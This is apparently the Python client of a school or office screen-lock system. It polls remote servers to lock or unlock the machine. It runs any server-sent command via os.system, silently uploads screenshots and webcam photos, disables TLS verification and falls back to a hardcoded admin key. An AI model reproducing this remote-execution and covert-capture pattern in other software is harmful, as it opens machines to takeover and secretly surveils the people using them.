import requests
import time
import subprocess
import os
import psutil
from PIL import ImageGrab
from cv2 import VideoCapture, imwrite, Laplacian, CV_64F
import win32file
import uuid

executed_commands = []
headers = {
    'User-Agent': 'MFLES Screen Lock v1.2.0'
}
machine_uuid = str(uuid.UUID(int=uuid.getnode()))

try:
    f = open('C:/screenlock/config.ini', 'r', encoding='utf-8')
    addr = f.readline().strip()  # 读取配置的门牌号
    f.close()
except:
    addr = "获取失败"


def sync_with_mywwzh():
    try:
        response = requests.get(
            "https://msl.mywwzh.top/select_admin_key.php", verify=False, headers=headers)
        if (response.status_code == 200):
            admin_key = response.text
        else:
            admin_key = "CFDA0330819B58D7A08D23DB182FA8EE0508D7CD56687E69FFFBF06B40618DFDDD306422A843F2090458F6C33556B191900034F7ED2A92BE76D0BA32724A49F4"
    except:
        admin_key = "CFDA0330819B58D7A08D23DB182FA8EE0508D7CD56687E69FFFBF06B40618DFDDD306422A843F2090458F6C33556B191900034F7ED2A92BE76D0BA32724A49F4"

    def check_process_exists(process_name):
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == process_name:
                return True
        return False

    def check_usb_unlock():
        try:
            drives = win32file.GetLogicalDrives()
            for drive in range(26):
                if drives & (1 << drive):
                    usb_path = '{}:\\'.format(chr(drive+65))
                    key_path = os.path.join(usb_path, '.msl_key', 'key.key')
                    if os.path.exists(key_path):
                        with open(key_path, 'r') as f:
                            file_content = f.readline().strip()
                        if file_content == admin_key:
                            print("usb key unlock")
                            if check_process_exists("mainui.exe"):
                                os.system("taskkill /f /im mainui.exe")
                                subprocess.Popen("C:/Windows/explorer.exe")
        except Exception as err:
            try:
                data = {"addr": addr, "message": str(err)}
                requests.post("https://msl.mywwzh.top/error_report.php",
                              data=data, headers=headers)
            except:
                pass

    def upload_screenshot(addr):
        try:
            screenshot = ImageGrab.grab()
            screenshot.save("C:/screenlock/screenshot.png")
            data = {"addr": addr}
            files = {'file': open('C:/screenlock/screenshot.png', 'rb')}
            requests.post(
                'https://msl.mywwzh.top/upload_screenshot.php', files=files, data=data, headers=headers)
        except Exception as err:
            try:
                data = {"addr": addr, "message": str(err)}
                requests.post("https://msl.mywwzh.top/error_report.php",
                              data=data, headers=headers)
            except:
                pass

    def upload_camera(addr):
        try:
            # 打开默认相机
            cap = VideoCapture(0)
            # 检查相机是否成功打开
            if not cap.isOpened():
                return
            # 延迟一段时间等待相机稳定
            time.sleep(3)
            # 初始化最佳图像和最佳清晰度
            best_frame = None
            best_focus = 0
            # 捕获多帧图像并选择最清晰的一帧
            ret, frame = cap.read()
            for _ in range(20):
                ret, frame = cap.read()
                if ret:
                    # 计算图像清晰度
                    focus = Laplacian(frame, CV_64F).var()
                    # 如果当前图像更清晰，则更新最佳图像和最佳清晰度
                    print(focus, best_focus)
                    if focus > best_focus:
                        best_focus = focus
                        best_frame = frame

            # 如果成功捕获到图像
            if best_frame is not None:
                # 保存最佳图像到文件
                imwrite("C:\\screenlock\\camera.png", best_frame)
            else:
                imwrite("C:\\screenlock\\camera.png", frame)
            cap.release()
        except Exception as err:
            try:
                data = {"addr": addr, "message": str(err)}
                requests.post("https://msl.mywwzh.top/error_report.php",
                              data=data, headers=headers)
            except:
                pass

        try:
            data = {"addr": addr}
            files = {'file': open('C:\\screenlock\\camera.png', 'rb')}
            requests.post(
                'https://msl.mywwzh.top/upload_camera.php', files=files, data=data, headers=headers)
        except Exception as err:
            try:
                data = {"addr": addr, "message": str(err)}
                requests.post("https://msl.mywwzh.top/error_report.php",
                              data=data, headers=headers)
            except:
                pass
    try:
        check_usb_unlock()
        if check_process_exists("mainui.exe"):
            is_locked = "lock"
        else:
            is_locked = "unlock"
        api_url = "https://msl.mywwzh.top/sync.php?addr={0}&is_locked={1}".format(
            addr, is_locked)
        response = requests.get(api_url, verify=False, headers=headers)
        if response.status_code == 200:
            data = response.json()
            status = data["status"]
            status_set_time = float(data["status_set_time"])
            command = data["command"]
            command_set_time = float(data["command_set_time"])
            show_screen_set_time = float(data["show_screen_set_time"])
            show_camera_set_time = float(data["show_camera_set_time"])

            current_time = time.time()

            if current_time - status_set_time < 5:
                if status == "unlock" and status_set_time not in executed_commands:
                    try:
                        print("server unlock")
                        os.system("taskkill /f /im mainui.exe")
                        subprocess.Popen("C:/Windows/explorer.exe")
                        executed_commands.append(status_set_time)
                    except Exception as err:
                        try:
                            data = {"addr": addr, "message": str(err)}
                            requests.post(
                                "https://msl.mywwzh.top/error_report.php", data=data, headers=headers)
                        except:
                            pass
                elif status_set_time not in executed_commands:
                    executed_commands.append(status_set_time)
                    if not check_process_exists("mainui.exe"):
                        subprocess.Popen("C:/screenlock/mainui.exe")

            if current_time - command_set_time < 5 and command_set_time not in executed_commands:
                command = data["command"]
                executed_commands.append(command_set_time)
                if command is not None:
                    # 执行 command 的命令
                    os.system(command)

            if current_time - show_screen_set_time < 5 and show_screen_set_time not in executed_commands:
                upload_screenshot(addr=addr)
                executed_commands.append(show_screen_set_time)

            if current_time - show_camera_set_time < 5 and show_camera_set_time not in executed_commands:
                upload_camera(addr=addr)
                executed_commands.append(show_camera_set_time)
    except Exception as err:
        try:
            data = {"addr": addr, "message": str(err)}
            requests.post(
                "https://msl.mywwzh.top/error_report.php", data=data, headers=headers)
        except:
            pass


def sync_with_mfles():
    try:
        response = requests.get(
            "https://msl.mywwzh.top/select_admin_key.php", verify=False, headers=headers)
        if (response.status_code == 200):
            admin_key = response.text
        else:
            admin_key = "CFDA0330819B58D7A08D23DB182FA8EE0508D7CD56687E69FFFBF06B40618DFDDD306422A843F2090458F6C33556B191900034F7ED2A92BE76D0BA32724A49F4"
    except:
        admin_key = "CFDA0330819B58D7A08D23DB182FA8EE0508D7CD56687E69FFFBF06B40618DFDDD306422A843F2090458F6C33556B191900034F7ED2A92BE76D0BA32724A49F4"

    def check_process_exists(process_name):
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == process_name:
                return True
        return False

    def check_usb_unlock():
        try:
            drives = win32file.GetLogicalDrives()
            for drive in range(26):
                if drives & (1 << drive):
                    usb_path = '{}:\\'.format(chr(drive+65))
                    key_path = os.path.join(usb_path, '.msl_key', 'key.key')
                    if os.path.exists(key_path):
                        with open(key_path, 'r') as f:
                            file_content = f.readline().strip()
                        if file_content == admin_key:
                            print("usb key unlock")
                            if check_process_exists("mainui.exe"):
                                os.system("taskkill /f /im mainui.exe")
                                subprocess.Popen("C:/Windows/explorer.exe")
        except:
            pass
    try:
        check_usb_unlock()
        if check_process_exists("mainui.exe"):
            is_locked = "lock"
        else:
            is_locked = "unlock"
        api_url = "https://oa.mfles.cn/api/v1/sync?duid={0}&is_lock={1}&muid={2}".format(
            addr, is_locked, machine_uuid)
        response = requests.get(api_url, verify=False, headers=headers)
        if response.status_code == 200:
            data = response.json()
            status = data["status"]
            status_set_time = float(data["status_set_time"])

            current_time = time.time()

            if current_time - status_set_time < 5:
                if status == "unlock" and status_set_time not in executed_commands:
                    try:
                        print("server unlock")
                        os.system("taskkill /f /im mainui.exe")
                        subprocess.Popen("C:/Windows/explorer.exe")
                        executed_commands.append(status_set_time)
                    except:
                        pass
                elif status_set_time not in executed_commands:
                    executed_commands.append(status_set_time)
                    if not check_process_exists("mainui.exe"):
                        subprocess.Popen("C:/screenlock/mainui.exe")
    except:
        pass


if __name__ == "__main__":
    while True:
        api_source = "https://msl.mywwzh.top/get_source.php?addr={0}".format(
            addr)
        try:
            response = requests.get(
                api_source, verify=False, headers=headers).text
            if response == "mfles":
                sync_with_mfles()
            elif response == "mywwzh":
                sync_with_mywwzh()
        except:
            sync_with_mfles()
        time.sleep(2)
